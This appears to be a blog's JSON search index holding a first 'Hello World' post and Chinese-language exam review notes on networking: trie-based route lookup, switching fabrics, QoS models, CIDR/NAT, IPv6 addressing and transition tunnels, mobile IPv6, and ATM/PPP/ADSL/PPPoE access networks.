[{"content":"Welcome to AGA\u0026rsquo;s Blog. This is my first post.\nFor more information about this theme, check the documentation: https://stack.jimmycai.com/\n","date":"2023-10-18T17:55:36+08:00","image":"https://anonymity-0.github.io/posts/hello-world/cover_huf17888c423d4998eadaee1ca18c79e46_784100_120x120_fill_q75_box_smart1.jpg","permalink":"https://anonymity-0.github.io/posts/hello-world/","title":"Hello World"},{"content":"路由器功能与架构 数据路径功能 根据分组目的IP地址查找转发表 通过交换结构转发到输出端口 输出端口调度和队列管理 控制面功能 运行路由协议，构建路由表 系统配置和管理 路由查找算法 Binary Trie ![[Pasted image 20240102174052.png]] ![[Pasted image 20240102174131.png]]\n####性能\n最差情况下，查找算法需要遍历Trie的所有层次，所以最差情况下需要有W次存储器访问，W为前缀的最大长度，对于IPv4为32，查找复杂度和更新复杂度为O(W) 最差情况下，增加一个前缀，需要增加W个节点，存储复杂度为O(NW)，N为转发表中的前缀数量 Leaf Pushing ![[Pasted image 20240102174439.png]]\nPath Compression Compression：Trie中只有一个子节点的非前缀节点能够被删除 节点保持Compression相关信息 skip value：指示路径上有多少个比特被跳过 segment：指示最后一次跳过操作以来具体遗漏的比特串 ![[Pasted image 20240102175058.png]] 性能 路径压缩可以有效地减少稀疏binary trie的高度 在最差情况下，没有压缩的可能，因此采用路径压缩后查询和更新复杂度与binary trie一样，都是O(W) Multi-bit Trie 查找时同时检查多个比特，称为查找步长（Stride） 如果前缀长度不为步长的整数倍，则对其进行扩充 例如步长为3，对于前缀1*可以扩充为100,101,110,111 步长为k，则Trie中的每个节点的条目数量为2k 每个条目组成：\u0026lt;下一跳信息，指向下一个子节点的指针（可以为空）\u0026gt; ![[Pasted image 20240102183349.png]] 性能 步长为k比特，则查找的复杂度为O(W/k)，W为地址的长度 更新复杂度O(W/k*2^k),每个节点有2^k个条目 存储（空间）复杂度O(N*2^k*W/k),N为转发表表项数量 Leaf Pushing优化 节点上的每个条目要么包含一个指针，要么包含下一跳信息 相当于把下一跳信息Push down到叶子节点 存储空间减少为1/2 ![[Pasted image 20240102183713.png]] LC Trie构造 节点分布稀疏时，Path Compression是压缩Trie的有效途径 固定步长multi-bit能够提高查找性能，但是当节点分布稀疏时存储冗余大 节点分布越密，存储效率越高，完全Trie无冗余！\n如果Trie的中间节点包含前缀，则进行Leaf Pushing操作，使得Trie中只有叶子节点包含前缀（即为前缀节点） 通过Path Compression将Trie压缩（就是去掉只有一个孩子的节点） 当子Trie的结构为完全子Trie时执行Multi-bit查找（完全二叉树只留叶子结点） 在LC Trie中每个节点需要保存： Path Compression信息(Skip Value, Segment) Multi-bit查找信息 (Stride) ![[Pasted image 20240102185801.png]]\n性能 查找步长为k，则查找复杂度、更新复杂度及存储复杂度与multi-bit Trie相同 查找复杂度为O(W/k)，W为地址长度 更新复杂度为O(W/k*2^k) 存储（空间）复杂度O(N*2^k*W/k),N为转发表表项数量 tree Bitmap算法 交换结构 概念 吞吐量（Throughput) 当所有的输入端口以线速承载100%的业务的时候，平均汇聚输出速率和平均汇聚输入速率的比率 如果所有空闲输入-输出端口对都可以传输数据，则可以认为吞吐量是100% 线路速率（Line Speed）：简称为线速，交换机端口连接的线路所能达到的最高速率 加速（Speedup） 交换结构的内部转发速率和单个输入端口线速的比值 如果加速超过1，则输出端口必须使用缓存 输出竞争 多个输入端口请求同一个输出端口导致输出竞争 由IP业务的突发性导致 内部阻塞 交换结构内部竞争导致内部阻塞 无阻塞：空闲输入端口和空闲输出端口之间的连接始终可以被建立 空闲端口：没有连接或者没有被请求连接的端口 交换机输出竞争和内部阻塞都会降低吞吐量，但后者是可以避免的，而前者是无法避免的 阻塞一般是指交换结构内部争用所导致，而输出竞争是发生在交换机的输出端口.阻塞和输出竞争是在空分交换中发生，对于时分交换，业务在时间上进行复用可以避免阻塞\n3代交换结构 第一代：共享存储器交换，交换机速率受限于共享的存储器的访问速度，通常汇聚容量小于0.5Gbps 第二代：共享媒介交换，交换机速率受限于共享的总线（媒介）速率，通常汇聚容量小于5Gbps 第三代：空分交换，交换机速率受限于交换结构，通常汇聚容量可达到50Gbps甚至更高 Banyan交换结构 Banyan交换结构为单路径多级交换结构 多级交换结构一般是由较小的交换单元组成的大的交换系统，也称为交换网络，交换单元常用2×2 Crossbar 共有log2N级，每一级都有N/2个交换单元，总交叉点数量：Nx=4×N/2× log2N ![[Pasted image 20240102195733.png]] ![[Pasted image 20240102195858.png]] 输入队列与输出队列 ![[Pasted image 20240102200202.png]]\n![[Pasted image 20240102200038.png]]\n","date":"2024-01-03T18:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E5%85%AD%E7%AB%A0/","title":"信息网络协议基础第六章复习"},{"content":"•基本概念\n–QoS度量参数；流、行为集合、服务等级协议\n基本概念 QoS度量参数 常用的描述QoS需求的参数包括：带宽、延迟、延迟抖动、突发（峰值）速率、最大突发长度、丢包率\n带宽 ：给定介质、协议或连接的额定吞吐量，实际上指应用程序在网络中通信所需要的“管道大小”，也可以认为是用户对网络传输速率的要求 最小带宽（最小分组速率）：传输中的最小瞬时速率，可用产生两个相邻分组的最大时间间隔的倒数来表示 峰值带宽（峰值分组速率）：传输中的最大瞬时速率，可用产生两个相邻分组的最短时间间隔的倒数来表示 平均带宽（平均分组速率）：一段时间内分组传输的平均速率 延迟：分组从发送端到达接收端的时间间隔 传输延迟：发送分组的第一个比特到发送最后一个比特的时间间隔，取决于发送接口的速率和分组的大小 传播延迟：发送分组的一个比特到接收端接收到该比特的时间间隔，取决于传输介质和传输距离 处理延迟：分组从到达节点到进入输出队列的时间间隔，包括对分组头标处理，路由查找等，取决于节点的处理能力和分组处理的复杂度 排队延迟：分组从进入输出队列到开始输出的时间间隔，取决于队列长度和调度策略 ![[Pasted image 20240102164138.png]] 延迟抖动：端到端延迟的变化特性，由延迟的可变部分的变化导致的，流量的突发、不公平的队列调度算法都可能导致较大的延迟抖动 流 从一个源到一个目的的有序分组集合被称为一个流（Flow) 一般来说，流是由特定于具体应用并且具有相同QoS需求的分组所组成 一个流和一个应用会话（Session）相对应，所以在后面叙述中有时将流的概念和会话的概念等同 ==IP网络中通常用五元组\u0026lt;源IP地址、目的IP地址、源端口号、目的端口号、协议\u0026gt;来标识一个流== 在面向连接的网络中，属于同一个流的所有分组将会走相同的路径到达目的地 ，在无连接的网络中，属于同一个流的分组可能会走不同的路径到达目的地 行为集合 在路由器上执行相同QoS操作的分组的集合 多个流如果具有相同的QoS操作，则在路由器上可以汇聚成一个行为集合 ==行为集合有时与类（Class）的概念等同，流可以看作是只有1个流的行为集合或者类== 支持QoS操作的路由器功能 接纳控制 当应用要求QoS服务时，判断其要求是否能够得到满足，应该是放在每个网络的入口路由器上 流量调节 检查到达的分组是否满足SLA中设定的QoS水平，如果不满足，实施事先指定的整形操作，包括丢弃、延迟、重标记等 流量控制 为了满足QoS需求（带宽、丢包率、延迟、延迟抖动等），选择是否向输出链路输出分组以及控制分组的输出顺序（即队列管理和调度），该功能设置在输出端口处 两个服务质量模型 综合服务原理 资源预留 发送应用通过建立消息将想发送流的流量特性发送给路径上的每个路由器和接收主机 路径上路由器在建立消息中附加上可以提供的QoS信息（例如预测的延迟等）送给接收主机 接收应用接收预留建立消息中的QoS信息，决定数据传输所需QoS参数，并将其通过预留消息沿相反路径通知给沿途路由器和发送主机 路径上的路由器根据预留消息预留所需网络资源 数据流传输 发送主机发送遵循预留规定的数据流 流量调节 中间路由器监测数据流是否满足预留规定，如果不满足 对于保证型服务，采用整形 对于受控负载型服务，将不符合的分组转为尽力服务 流量控制 路由器根据指定的服务类型，对每个流的分组进行调度和队列管理，实现指定QoS（带宽、延迟等） 综合服务类型 ![[Pasted image 20240102171144.png]]\n综合服务缺点 基于流的细粒度资源分配，存在可扩展性问题 带宽、存储、处理开销随着流的数量的增加而急剧增长 区分服务原理 预先设置PHB 在支持区分服务的网络中，由网络管理员事先在每个路由器上设置行为集合（DSCP）所对应的PHB 数据传输 应用P直接向接收主机B发送分组，分组到达R1首先进行分类，标记其DSCP为101110，判断其速率是否大于1Mbps，如果是，则进行丢弃整形。R2、R3根据分组DSCP执行相应的PHB，即以1Mbps的速率转发分组 • PHB（逐跳行为）： 在每个节点上描述根据DSCP对特定行为集合（类）进行资源分配的方式，具体由相应的流量控制（队列管理和调度）来实现\nEFPHB，加速转发型PHB 提供低丢失率、低延时和低延时抖动的服务 严格限制EF分组到达路由器的速率小于设定的路由器转发EF分组的速率 通过在位于网络入口的路由器上限制进入的EF分组不超过某一最大速率，从而实现对EF分组速率的限制 EF由具体的调度算法来实现 推荐DSCP为101110（46） AF确定转发型PHB 比尽力更好的PHB，为用户提供不同级别的转发保证,定义了四个等级，每个等级定义了3个丢弃优先级 DSCP 服务等级/丢弃优先级 等级 1 等级 2 等级 3 等级 4 低 001010 010010 011010 100010 中 001100 010100 011100 100100 高 001110 010110 011110 100110 IP分组转发保证取决于: 多少资源分配给此分组所属的AF等级,以及此AF等级当前的负载和拥塞情况 分组的丢弃优先级 ![[Pasted image 20240102171449.png]] 试图结合综合服务和区分服务的优点\n综合服务提供细粒度的以流（Flow）为单位的QoS，并且通过资源预留能够保证端到端的QoS,适用于规模较小的接入网络 区分服务通过对流进行聚类（BA），并且在路由器上事先设置分组的处理规则（PHB），具有更好的可扩展性,适用于业务流量大的核心网 在6to4网络中，IPv6地址的前32位是固定的2002，接下来的32位是IPv4地址的16进制表示。因此，路由器R的IPv4地址238.136.16.1对应的16进制表示为EE88:1001。所以，我们可以给子网W1和W2分配的6to4子网前缀如下：\n子网W1的6to4子网前缀：2002:EE88:1001:1::/64 子网W2的6to4子网前缀：2002:EE88:1001:2::/64 ","date":"2024-01-02T18:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%BA%94%E7%AB%A0/","title":"信息网络协议基础第五章复习"},{"content":" CIDR •CIDR：Classless Inter-Domain Routing，无类别域间寻路\n目前Internet采用的IP地址分配方式，1990年代由IETF提出，取代早期的有类别的地址分配方式 采用可变长度的网络前缀(network prefix)来取代地址分类中网络号长度固定的做法 具有相同前缀的IP地址组成CIDR Block，表示为A.B.C.D/N，其中N为前缀长度 例如202.38.208.0/20 前缀汇聚(Supernetting) 前缀汇聚举例 8个连续的/24的CIDR Block可以用一个/21的CIDR Block来表示，因此对外汇聚成一条/21的路由 200.25.16.0/24~200.25.23.0/24\u0026ndash;〉\n(0001 0000~0001 0111)\n200.25.16.0/21\n前缀最长匹配(Longest-prefix Match) 在CIDR中，如果路由器上的路由表中有多条表项满足要求，则采用前缀最长匹配规则 前缀最长匹配：R0上对于目的地址为200.25.22.32的IP分组分组，匹配的路由表表项包括200.25.16.0/21和200.25.22.0/24，但使用最长匹配规则选择200.25.22.0/24 NAT 根据作用范围的不同，分两种IP地址\n全局IP地址：用于Internet上的分组转发，要求在Internet范围内唯一， 私有IP地址：用于指定网络内的分组转发，只要求在指定网内部唯一 基本NAT：只使用IP地址信息 最简单的NAT还是需要多个全局的IP地址，一般在NAT设备上维护一个address pool，address pool中地址的数量应该多于有访问外部网络需求的主机的数量。\n网络地址和端口转换NAPT 最常用的一种NAT方式 使用IP地址和TCP/UDP端口号 NAPT操作不仅仅要修改分组的IP头标，还要修改TCP/UDP头标中的端口号 在NAT设备上，虽然内部网络所有的主机共享同一个全局IP地址，但是经过NAT之后不同会话使用的端口号不同 局限性 地址和端口转换将带来比较大的开销 IP地址和端口号可能存在于载荷的任何位置，因此需要软件针对具体的应用做额外的处理 并不是所有的数据都是使用UDP或者TCP来传输 破坏了原有的主机到主机的通信模型 IPv6地址 目前所有IPv6子网的前缀长度都是64比特！\n类型 单播地址(Unicast) 分配给节点上的某个特定网络接口,目的地为单播地址的分组被转发到该接口上 组播/多播地址(Multicast) 分配给一组网络接口，这些网络接口一般位于不同的节点，目的地为组播地址被转发到这组接口上 任播地址(Anycast) 分配给一组网络接口,这些网络接口一般位于不同的网络节点，目的地为任播地址的分组被转发到该组接口中距离发送主机最近的节点(依据路由协议度量的最近距离) Anycast 地址从单播地址空间分配，只能被分配给路由器，并且不能用作源地址，用于基于UDP的DNS查询（无状态，无连接），应用范围：站点范围，全局使用还需进一步考虑 单播地址 有些机制，特别是自动配置机制，所需的信息在子网范围内都可以获得，例如获取目标的MAC地址、获取子网前缀等，不需要全局的IPv6地址\n链路局部地址（Link-Local）：作用范围为链路，在链路范围内分配 前面10比特固定为1111 1110 10，接下来为54比特的0，具有形式FE80:/64 Interface ID：标识主机上的特定接口 链路局部地址总是自动配置，只用于链路范围内的数据传输 唯一本地地址（Unique Local）：与IPv4私有地址类似，一般限制在组织机构内部使用，但不会被转换成全局单播地址 全局（Global）：作用范围为全局，在全局范围进行分配 ![[Pasted image 20240102122226.png]] 前面3比特固定为001，第1个16比特为2000到3FFF Global Routing Prefix：全局路由前缀，由服务提供商(ISP)分配给用户站点（Site）的前缀 Subnet ID：标识特定的子网，一个站点中可能有多个子网 Interface ID：标识主机上的特定接口，大多数情况下长度为64 单播地址的组成 ![[Pasted image 20240102122046.png]]\n组播地址 前面8比特固定为1111 1111，具有形式FF::/8 Flags 4bit: 指示组播地址是永久的还是临时的等信息 Scope 4bits：指示组播的范围 0010 Link-local scope Group ID 112bits：标识组播组，在Scope作用范围内唯一 常用组播地址 全节点地址： FF02::1(link-local) 全路由器地址: FF02::2(link-local) 被请求节点地址（Solicited-node address） 例如: 4037::01:800:200E:8C6C ➡️FF02::1:FF0E:8C6C IPv6组播地址到MAC地址映射 网络接口维护一个感兴趣的目的MAC地址列表，包括\n接口的单播MAC地址 广播MAC地址FF:FF:FF:FF:FF:FF IPv6组播地址所对应的MAC地址(如果网络接口所在节点加入到组播组，有些组播组是必须加入的，例如全节点组播组，被请求节点地址对应的组播组) 例子： IPv6主机具有MAC地址00:AA:00:3F:2A:1C（链路局部地址为FE80:2AA:FF:FE3F:2A1C），其网络接口感兴趣的目的MAC地址表除包含广播MAC地址 FF:FF:FF:FF:FF:FF外，还包括以下组播MAC地址： 33:33:00:00:00:01，对应着链路局部范围内的全节点组播地址FF02::1 33:33:FF:3F:2A:1C，对应着被请求节点地址FF02::1:FF:3F:2A1C 特殊地址 未指明地址：全0(::) 没有有效地址的时候使用 回环地址（::1） 指代网络节点本身 IPv6网络中的邻居发现机制 邻居发现机制基于ICMPv6消息实现，通过ICMPv6消息管理同一链路上的节点到节点通信（网络层机制） 用于邻居发现的ICMPv6消息的IPv6地址为链路局部地址，Hop limit为255，从而将邻居发现消息限制在链路范围内 邻居发现机制中地址的选择遵循以下原则：\n源地址：如果节点没有任何有效地址，那么发数据时使用::作为源地址 目的地址：如果节点不知道目的的任何地址包括IPv6地址，则使用FF02::1或者FF02::2 如果节点知道目的的IP地址，但不知道MAC，则使用该IP地址对应的被请求节点地址 地址解析 确定邻居节点的链路层地址（MAC地址）\n通过在节点之间交换邻居请求(NS)和邻居公告(NA)消息来完成 网络层机制：NS和ND均为ICMPv6消息 过程 判断是否需要进行地址解析过程 每个节点维护邻居缓存：邻居IPv6地址\u0026lt;\u0026mdash;\u0026gt;MAC地址 查找邻居缓存 根据需要开始地址解析过程 发送节点发送邻居请求（NS）：组播发送，包含要解析的IPv6地址（目标地址） 目标节点接收并处理NS，响应邻居公告（NA））：单播发送，包含目标节点MAC地址 发送节点更新邻居缓存 例子 ![[Pasted image 20240102135406.png]] ![[Pasted image 20240102135501.png]] 地址重复检测 自动配置地址最重要的是保证地址不重复 为什么IPv6地址只要保证在链路上不重复就可以？ 地址重复检测 (DAD)：基于邻居请求（NS）/邻居公告（NA）来实现 节点发送NS，其中包含要检测的IPv6地址 如果收到相应的NA，则检测到重复，节点不会使用重复的地址，否则开始使用该IPv6地址 检测到地址重复后的具体处理依赖于实现 ![[Pasted image 20240102135711.png]] ![[Pasted image 20240102135736.png]] 路由器发现 相关消息\n路由器公告消息（RA） 路由器请求消息（RS： Router Solicitation） 具体过程\n被动式 IPv6路由周期性（例如200s）公告RA：组播发送，使用FF02::1 同一链路上的IPv6主机接收RA消息，并且使用其内容来配置或者维护网络参数设置 主动式 IPv6主机主动发送路由器请求RS：组播发送，使用FF02::2 同一链路上的路由器响应RA：单播或者组播方式发送 ![[Pasted image 20240102140212.png]]\n![[Pasted image 20240102140307.png]]\nIPv6地址自动配置过程 IPv6节点上地址自动配置过程（基于EUI-64地址） 1.路由器发现过程：主机发送路由器请求（RS）消息，路由器响应路由器公告（RA）消息，获取子网前缀等信息 2.基于FE80::/64 和 EUI-64地址生成的接口标识生成链路局部地址，设置为尝试（Tentative）状态 2.执行地址重复检测(DAD)过程 3.若DAD成功，将其设置为有效（Valid/Preferred）状态 4.将链路局部地址的被请求节点地址所对应的组播MAC加到网络接口的感兴趣MAC地址表中 5. 根据RA中包含的其它信息进行缺省路由等网络参数的配置 全局 IPv6 地址=IPv6 前缀 64bits+lpv6 接口标识 64bits eg.BC:AE:C5:C2:07:21 一、IPv6借口标识生成\nMAC地址 U/L 位取反：BC（1100):AE:C5:C2:07:21- BE （1110):AE:C5:C2:07:21 第三个和第四个字节之间插入 FFFE，变为BE-AE-C5-FF-FE-C2-07-21 写成冒号 16 进制,BEAE:CSFF:FEC2:721 二、全局 IPv6地址:2002:1:0:3:BEAE:C5FF:FEC2:721 路由表 每个路由器和主机都维护路由表（转发表） \u0026lt;目的网络/目的主机、下一跳IP地址、…..\u0026gt; IPv4/IPv6过渡机制 手工配置隧道 对每个IPv6分组，都事先手工配置它所对应的隧道的端点，主要是用于隧道封装所需的IPv4地址 自动配置隧道 分组中所包含的IPv6地址和/或路由的下一跳决定隧道的端点，主要是指用于隧道封装所需的IPv4地址 ISATAP 0:5EFE:w.x.y.z，w.x.y.z为私有单播IPv4地址 200:5EFE:w.x.y.z w.x.y.z为公共（全局）单播IPv4地址 eg，RI 为ISATAP路由器，为支持 IPv6-in-IPv4 隧道，R1 在网络1中公告IPv6 前缀 2002:1:0:1::/64，主机 A的IPV4地址：160:0:0:2，主机 A 的 ISTAP地址？ 全局：2002:1::1:200:5EFE:160.0.0.2或2002:1:0:1:200:5EFE:160.0.0.2 链路局部：FE80::200:5EFE:160.0.0.2 试着写出ISSTAP路由表，假设前缀为2001:DB8:0:7::/64 host：\n2001:DB8:0:7::/64. On-Link 同一网段的路由器 FE80::200:5EFE:路由器端口ipv4 router\n2001:DB8:0:7::/64. On-Link 不同的端口 \u0026lt;\\下一个router的前缀，连接下一个router的端口ip\u0026gt; 如果没有前缀，就写为::/0 6to4 根据分配给组织机构的全局（公共）IPv4地址，可以生成并且使用48比特全局IPv6地址前缀（2002:WWXX:YYZZ::/48）\n路由一定有一条：2002:/16 On-Link Throughthe 6to4 Interface host指向同一网段的路由器\n2002:xxxxx router指 目的，下一跳 \u0026lt;\\下一个router的前缀，连接下一个router的端口ip\u0026gt; –手动隧道配置、自动隧道（ISATAP、6to4）原理和配置 ","date":"2024-01-02T16:12:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%89%E7%AB%A0/","title":"信息网络协议基础第三章复习"},{"content":"移动切换 两种切换情况 切换涉及的AP在同一个网络中-链路层切换 链路层切换不改变IP地址，执行链路层操作 不改变五元组，对应用会话无影响 切换涉及的AP在不同的网络中-网络层切换 不同网络不同AP之间的切换首先执行链路层切换，再执行网络层切换，进行网络相关参数配置 移动节点IP地址发生变化 如何消除切换对应用会话的影响？ 应用层解决方案：需要应用支持，本质上是重新建立IP会话 网络层解决方案：需要增强网络协议，对应用透明 应用会话大多通过五元组来标识 \u0026lt;源/目的IP地址、协议、源/目的端口号\u0026gt; 不同的五元组对应着不同的应用会话 移动IPv6 – 基本原理、如何对上层应用屏蔽移动性？\n基本关键词 家乡地址(HoA)：移动节点的标识，手动配置或者由家乡网络分配，通常不变 转交地址(CoA)：移动节点位置的标识，由移动到的外地网络分配，随位置变化 HoA与CoA的对应关系称为绑定(Binding)\u0026lt;HoA, CoA\u0026gt; 家乡代理(Home Agent)：保存移动节点的家乡地址和转交地址之间的映射关系(绑定) IP分组先发送到家乡代理，由家乡代理发送给移动节点！ 过程 移动检测 移动节点检测到自己移动到了外地网络 路由器公告 转交地址配置 \u0026lt;家乡地址、转交地址\u0026gt;的绑定注册 到家乡代理 到通信对端 家乡代理拦截到移动节点地址的分组 对IP以上层屏蔽移动性 双向隧道模式 移动节点和通信对端的通信始终使用家乡地址进行通信 移动节点的移动由家乡代理跟踪，对于通信对端来说是透明的 所有的通信都必须通过家乡代理转发 路由优化模式 通信对端知道移动节点当前的转交地址。 PMIPv6 引入原因• 为什么引入代理移动IPv6？\n更加易于部署 更加易于管理 更好的性能 原理 网络端控制的移动管理 在网络中引入一个功能实体代理移动节点执行与家乡代理之间的信令 本地移动管理 在本地管理域中引入一个类似家乡代理的功能实体，负责管理域内的移动管理操作 ","date":"2024-01-02T13:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E7%AC%AC%E5%9B%9B%E7%AB%A0-ip%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86/","title":"信息网络协议基础第四章复习"},{"content":"接入网 用来把用户网络或者设备接入到Internet的网络 也被称为最后1公里接入 宽带接入成为主流（FCC [2010]: 4Mbps downstream/1Mbps upstream) DSL、Cable、Fibre、Wireless Broadband (Fixed/Mobile) 常用接入网类型 基于ATM架构类 传统电信网络：点对点 DSL（数字用户线路） 对称DSL 下行和上行速率相同SHDSL(利用了话音带宽） 非对称DSL 下行速率一般大于上行速率 ADSL ADSL2+: 基于IEEE 802参考模型的局域网架构类 新兴IP网络：共享 以太网（802.3）、无线局域网（802.11）、甚至包括无线城域网（802.16） 光纤接入类 基于ATM：APON、GPON 基于以太网：EPON ATM 概述 ATM： Asynchronous Transfer Mode，异步传输模式\n既可用于接入网，也可以用于核心网 面向连接的分组交换/虚电路交换\nQ.2931：连接建立信令 信元：基本交换单位，固定长度（5字节头标＋48字节数据） ==为什么选择固定长度（53字节）的信元？== ==1）构建硬件简单== ==2）交换单元并行处理== ==3）队列行为优化：控制延迟、提高队列处理效率== 信元 队列优化举例： 假设：链路带宽100Mbps，队列中的分组具有不同的优先级 变长分组网络：最大分组长度为4KB，在交换机开始传输一个4KB的分组之后到达一个高优先级的分组，必须在队列中等待327.68us才能通过输出端口传输（4KB= 32768b） ATM网络：信元固定长度为53B，最长等待时间将是53×8/100=4.24us，而且这个时间是固定的 结论：使用固定长度信元具有控制延迟的能力，特别是控制延迟抖动的能力，这对某些应用例如实时应用非常重要\n业务类型 CBR业务 Constant Bit Rate 提供最高程度的服务质量保证，保证带宽、延迟抖动 话音、视频等 VBR业务 Variable Bit Rate 业务产生的数据可能是突发的，要求延迟抖动小 具有突发性，可保证最大延迟，压缩话音、视频 ABR业务 Available Bit Rate 利用剩余带宽，根据网络可用带宽和拥塞状态来调整传输速率 文件传输、email等 UBR业务 Unspecified Bit Rate 利用剩余带宽，对延迟和延迟抖动没有严格要求的业务 文件传输、email等 虚电路 虚电路VPI和VCI来标识 VPI：Virtual Path Identification，虚路径标识 VCI：Virtual Channel Identification，虚通道标识 Why VPI+VCI？ VPI用于网络的主干中进行切换。它在ATM交换机上起到多路复用/解复用的作用，将来自各种源（ATM接口）的虚拟信道（VCs）汇聚到一个接口上的虚拟路径 另一方面，VCI用于在私有网络内标识连接。 Permanent Virtual Circuit (PVC) PVC是一种永久建立的连接，它使得在节点之间的物理连接上创建逻辑连接成为可能，这些节点经常或连续地进行通信 网络设备的VPI/VCI表格可以由管理员进行更新 Switched Virtual Circuit (SVC) Switched Virtual Circuit (SVC) 是一种在数据通信网络中在两个网络设备之间建立的临时逻辑连接 信元格式 ![[图片 1.png]]\nAAL 信元载荷的格式由AAL来决定 AAL：ATM Adaptation Layer，ATM适配层 Why AAL？ ATM可以用来承载可变长度的分组（例如IP分组），而ATM信元长度是固定的。 ![[Pasted image 20240102101545.png]] •根据传输业务的不同，分为AAL1～AAL5 AAL1：CBR、面向连接业务，例如恒定速率的音频和视频 AAL2：VBR业务，面向连接的业务，例如可变速率的音频和视频 AAL3/4：VBR、面向连接和无连接业务 AAL5：AAL3/4的简化版。最常用，用来承载IP分组 ATM与点对点链路 在电话线接入中 服务提供商事先给每个客户都事先分配了固定的VPI/VCI，大多使用PVC 为了便于管理，服务提供商一般通过PPP over ATM技术，将PVC变成一个逻辑的点对点链路集合 PPP 概述 PPP是个数据链路层协议 ，通过PPP，完成： 链路建立、维护和终结 用户认证 网络参数协商，包括IP地址分配等 对于接入服务器来说，每条PPP链路的另一端对应着一个用户，因此便于认证、计费和管理 PPP链路的两端对应着通信双方，因此不存在寻址问题 接入服务器要和AAA服务器(例如RADIUS)配合工作，以完成认证、计费等功能 AAA：认证、授权、计费 协议 PPP：Point to Point Protocol 在点对点链路上传输多种协议数据 协议构成 封装方法 封装各种协议数据的方法 在同一条链路上同时复用各种不同的网络层协议 链路控制协议（LCP：Link Control Protocol） 建立、配置、维护和终结链路 认证协议 PAP、CHAP 网络控制协议（NCP：Network Control Protocol） 建立和配置各种不同的网络层协议 对于不同的网络层协议定义有不同的NCP，例如对于IP协议是IPCP 说明 PPP over ATM缺乏有效的QoS和组播支持能力 业务均为ATM UBR类型，提供尽力服务 视频、高质量音频、实时视频会议等服务质量要求高的应用必须选择原始的ATM协议栈 ADSL 概述 早期电话拨号：局端过滤300Hz~ 3.4KHz 范围外的非话音频率 电话线的带宽\u0026gt; \u0026gt;4kHz（可用带宽2MHz左右。 ADSL：ADSL将用户线路接到没有滤波器的线路上 频率在26khz以上的信号被分离到DSLAM(用户数字线访问复用) 关键技术 调制技术：DMT 关键设备：DSLAM 体系结构：ATM、PPPOE 现在大多使用ADSL Router取代ADSL MODEM，可以由ADSL Router直接进行PPPOE拨号；也可以是ADSL Router+宽带路由器，由宽带路由器执行PPPOE拨号。\nDMT DMT：离散多音（Discrete Multi-Tone），用于ADSL的调制方法 利用电话线的1104KHz带宽，划分为256个载波（多音，子信道），每个子信道带宽为4.3125KHz 子信道0（0～4.3125KHz）：传统电话业务 子信道1~5（4.3125～25.875KHz）：保护频带 子信道6～31（25.875～138KHz）：26个上行信道 子信道32～255（138～1104KHz）：224个下行信道 双向数据传输时，为了避免上行和下行之间的干扰，在31～32附近的信道不被使用（保护频带，位于138KHz左右） 速率自适应：DMT以自适应的方式分配各个子信道的速率，以达到最佳的传输线路利用率，例如让信噪比较高的信道传送更多的位，关闭被窄频噪声所覆盖的子信道 ADSL带宽分析 DSLAM DSLAM：Digital Subscriber Line Access Multiplexer，数字用户线路访问复用器 将基于各种DSL技术的数字用户线路，包括ADSL，VDSL和SH.DSL，连接到运营商网络 DSLAM分为两侧，即用户侧和网络侧 用户侧：DSLAM和Modem之间始终为ATM over DSL，即来自主机的以太帧被封装成ATM信元，然后通过DSL传输 网络侧：早期为ATM，但是随着IP的普及，ATM逐渐被以太网所取代，这也代表了DSLAM的发展方向（IP化） PPPOE Why PPPOE? 用户希望能够通过一个CPE设备（用户前端设备，例如ADSL Modem）来接入多台主机 实际网络运行经验表明，以太网（Ethernet）是一种有效而且成本很低的多主机接入技术，但是以太网不支持认证、计费等功能。运营上同时希望能够实现基于用户的访问控制和计费功能。在传统的拨号网络中，通过PPP可以对用户进行认证、计费 一个自然的想法就是把以太网和PPP这两种技术结合起来，因此引入了PPPOE（PPP over Ethernet），在以太网上建立PPP连接，本质是在多路访链路上提供一条逻辑的点对点链路，也被称为PPPOE会话。 PPPOE分为两个阶段 发现阶段 为了在以太网上建立PPP会话，通信双方必须知道对方的MAC地址，并且协商一个唯一的会话标识（Session_ID） 主机发现网络中所有可用的BRAS（MAC地址），并且选择一个BRAS为其提供接入服务 无状态，不会分配任何资源 PPP会话阶段 标准的PPP过程，当PPP会话建立后，主机和BRAS为PPP会话分配资源 PPPOE帧格式 类型: 0x8863 用于Discovery阶段的帧 0x8864 用于PPP会话阶段 Code：0x00 PPP会话阶段、0x09 PADI、0x07 PADO、0x19 PADR、0x65 PADS、0xa7 PADT\nPPPOE的特点 通过PPPOE会话的建立和释放进行基于时间或者流量的统计，计费方式灵活方便 动态IP地址配置和管理 与传统拨号上网类似，提供基于用户名和密码的认证 由于存在多层协议封装，开销大 局域网 定义 局域网（LAN：Local Area Network）被定义为一个广播域，即在局域网内目的地址为广播地址的IP分组或者数据链路层帧会被所有的网络节点接收和处理 以太网是应用最广泛的局域网技术，对应着IEEE 802.3\n局域网参考模型 数据链路层被划分为两个子层，即逻辑链路控制(LLC)子层和媒介访问控制(MAC)子层 在传统的点对点链路控制中没有管理访问共享媒介的逻辑需求 ， MAC子层负责对共享链路访问进行控制 对于相同的LLC子层，可以提供不同的MAC子层 常用以太网、无线局域网等局域网具有相同的LLC子层，只是MAC子层不同 LLC 功能：传输服务/ 到上层的服务接口/流量控制等 LLC是一个对所有LAN都相同的链路层协议，它定义了两个用户之间数据交换的机制，提供了三种可选的服务 无确认的非连接服务（Unacknowledged 